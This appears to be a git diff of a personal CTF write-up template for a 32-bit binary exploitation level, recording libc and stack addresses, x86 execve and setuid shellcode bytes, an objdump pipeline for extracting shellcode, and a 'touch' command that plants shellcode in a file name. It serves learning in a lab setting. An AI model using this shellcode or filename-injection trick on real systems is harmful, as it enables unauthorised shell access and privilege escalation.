@@ -3,7 +3,7 @@ tags:
   - ctf
 created: 2026-06-24
 ---
-4
+
 # `Level [1]` 
 > 
 
@@ -26,7 +26,7 @@ created: 2026-06-24
 | strcmp compare      | #strcmp comrape with `s            |
 | /bin/sh address     | `0xf7f3bde8`<br>`\xe8\xbd\xf3\xf7` |
 | system address      | `0xf7dce8e0`<br>`\xe0\xe8\xdc\xf7` |
-|                     |                                    |
+|                     | 0xffffd51b                         |
 | esp addr for arg2   | 0xffffd4b8                         |
 | buffer address      | `0x804c05a`                        |
 `\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
@@ -37,19 +37,19 @@ created: 2026-06-24
 |      |             |       |
 ## 📚 Key commands/technics
 
-| Coomand                                                                                                                                                                                                               | Desctiption |
-| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- |
-| `objdump -d ./shellcode.o \| grep '[0-9a-f]:' \| grep -v 'file' \| cut -f2 -d: \| cut -f1-6 -d' ' \| tr -s ' ' \| tr '\t' ' ' \| sed 's/ $//g' \| sed 's/ /\\x/g' \| paste -d '' -s \| sed 's/^/"/' \| sed 's/$/"/g'` |             |
-|                                                                                                                                                                                                                       |             |
-|                                                                                                                                                                                                                       |             |
+| Coomand | Desctiption |
+| ------- | ----------- |
+|         |             |
+|         |             |
+|         |             |
 
 ## 💡 Step by step
 
-| Step | Action | Information |
-| ---- | ------ | ----------- |
-| 1    |        |             |
-| 2    |        |             |
-| 3    |        |             |
+| Step | Action | Information                                                                                                                                          |
+| ---- | ------ | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1    |        | \x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 |
+| 2    |        |                                                                                                                                                      |
+| 3    |        |                                                                                                                                                      |
 
 ## 🔍 Result
 Flag:
@@ -59,4 +59,8 @@ Flag:
 
 ## 🔗 Link
 - [Название ресурса](URL)
-`!touch sh_$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd5\x58\x58\xd5\xff\xff\x58\xd5")')`
+`touch $(python3 -c 'import sys; sys.stdout.buffer.write(b"sh_"+b"A"*11+b"\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+```nasm -f elf32 shell.asm
+ld -m elf_i386 -s -o shell shell.o
+objdump -d ./shell.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'```
